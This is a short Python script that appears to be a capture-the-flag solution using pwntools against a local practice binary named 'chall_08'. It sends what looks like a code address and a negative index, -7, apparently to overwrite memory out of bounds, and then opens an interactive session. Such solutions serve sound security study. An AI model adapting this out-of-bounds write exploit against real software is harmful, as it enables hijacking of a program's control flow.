# coding: utf-8
def chall08():
     p = process("./chall_08")
     elf = ELF("./chall_08")
     p.sendline("4198950")
     p.sendline("-7")
     p.interactive()
     
chall08()
